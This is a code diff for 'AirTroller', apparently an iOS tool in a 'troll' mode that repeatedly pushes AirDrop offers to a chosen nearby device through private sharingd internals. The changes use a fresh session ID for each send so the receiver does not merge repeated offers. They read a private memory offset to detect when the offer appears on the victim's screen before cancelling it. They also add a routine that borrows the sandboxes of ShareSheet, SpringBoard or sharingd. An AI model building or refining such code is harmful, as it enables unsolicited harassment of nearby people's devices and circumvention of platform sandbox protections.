@@ -142,7 +142,7 @@ final class AirTrollerManager: ObservableObject {
     @Published var isrunning = false
     @Published var mode: Mode = .troll
     @Published var triggerkind: TriggerKind = .delay
-    @Published var triggerdelayms: Double = 350
+    @Published var triggerdelayms: Double = 500
     @Published var triggerevent: Double = 5 {
         didSet { triggerevent = min(max(triggerevent, 0), 16) }
     }
@@ -316,6 +316,18 @@ final class AirTrollerManager: ObservableObject {
         }
     }
 
+    /// One-shot ladder over every donor candidate, each with a windowed borrow:
+    /// adopt a reachable sandbox, probe sharingd, restore. Nothing is left behind.
+    func adoptladder() {
+        appendlog("adopt: trying the donor ladder (ShareSheet, SpringBoard, sharingd)...")
+        workqueue.async {
+            let report = AirTrollerBridge.adoptionLadder()
+            DispatchQueue.main.async { [weak self] in
+                self?.appendlog("adopt: \(report)")
+            }
+        }
+    }
+
     private func schedulepoll(after seconds: Double) {
         guard isscanning else { return }
         DispatchQueue.main.asyncAfter(deadline: .now() + seconds) { [weak self] in
@@ -471,10 +483,13 @@ final class AirTrollerManager: ObservableObject {
 
             cycle += 1
             let started = Date()
+            // A fresh session per send: sharingd and the receiver may coalesce
+            // repeated offers that carry the same SessionID.
+            let sendsession = UUID().uuidString
 
             let ok = bridge.startSend(toNode: config.node,
                                       bundleID: config.bundleID,
-                                      sessionID: config.sessionID,
+                                      sessionID: sendsession,
                                       items: config.items,
                                       description: "AirTroller test payload",
                                       previewImage: config.previewimage,
@@ -488,23 +503,54 @@ final class AirTrollerManager: ObservableObject {
             }
 
             if !ok {
-                log("cycle \(cycle): startSendToNode failed, \(failure)")
+                log("cycle \(cycle): send did not start: \(failure)")
                 break
             }
 
-            log("cycle \(cycle): startSendForBundleID:\(config.bundleID) sessionID:\(config.sessionID) items:\(config.items.count) (\(config.items.first?.path ?? "")) previewImage:\(config.previewimage != nil ? "cgimage" : "nil") fromShareSheet:\(config.fromsharesheet ? "YES" : "NO")")
+            log("cycle \(cycle): send started (session \(sendsession.prefix(8)), live op \(AirTrollerBridge.nodeHasLiveOperation(config.node) ? "yes" : "no"), items \(config.items.count), preview \(config.previewimage != nil ? "cgimage" : "nil"), fromShareSheet \(config.fromsharesheet ? "YES" : "NO")")
 
-            if !airtrollersleep(config.triggerisevent ? airtrollerfallbacktriggerdelay : config.triggerdelayms) {
-                log("cycle \(cycle): stop requested inside the trigger window")
-                break
-            }
-
-            bridge.cancelSend(toNode: config.node)
-            let elapsed = Int(Date().timeIntervalSince(started) * 1000)
-            log("cycle \(cycle): cancelSend on \(config.name) at +\(elapsed)ms")
+            // With the event trigger, watch the live SFOperation's event word
+            // (__SFOperationNotifyClient writes it at op+0xb0) and wait for
+            // 3 WaitForAnswer - the moment the peer has the offer on screen.
+            // The timeout keeps cycles moving when the daemon stays silent.
+            var sawwaitforanswer = false
             if config.triggerisevent {
-                log("cycle \(cycle): live event trigger unreachable so far, used the \(Int(airtrollerfallbacktriggerdelay))ms delay instead")
+                let deadline = Date(timeIntervalSinceNow: 2.5)
+                while !airtrollershouldstop() && Date() < deadline {
+                    let event = AirTrollerBridge.lastOperationEvent(forNode: config.node)
+                    if event == 3 {
+                        sawwaitforanswer = true
+                        log("cycle \(cycle): event 3 WaitForAnswer after \(Int(Date().timeIntervalSince(started) * 1000))ms")
+                        break
+                    }
+                    if event < 0 {
+                        log("cycle \(cycle): operation disappeared before WaitForAnswer")
+                        break
+                    }
+                    usleep(40_000)
+                }
+                if !sawwaitforanswer && !airtrollershouldstop() {
+                    log("cycle \(cycle): no WaitForAnswer within 2.5s, falling back to the delay")
+                }
             }
+
+            // The cancel is unconditional on every exit path: a cycle that
+            // leaves _sender set wedges the node for the rest of the process,
+            // because nothing else ever clears it.
+            do {
+                defer { bridge.cancelSend(toNode: config.node) }
+
+                let delay = sawwaitforanswer
+                    ? config.gapms
+                    : (config.triggerisevent ? airtrollerfallbacktriggerdelay : config.triggerdelayms)
+                if !airtrollersleep(delay) {
+                    log("cycle \(cycle): stop requested inside the trigger window")
+                    return
+                }
+            }
+
+            let elapsed = Int(Date().timeIntervalSince(started) * 1000)
+            log("cycle \(cycle): cancelSend on \(config.name) at +\(elapsed)ms (live op after \(AirTrollerBridge.nodeHasLiveOperation(config.node) ? "yes" : "no"))")
 
             if config.issurvey {
                 if config.replaysyntheticevents {
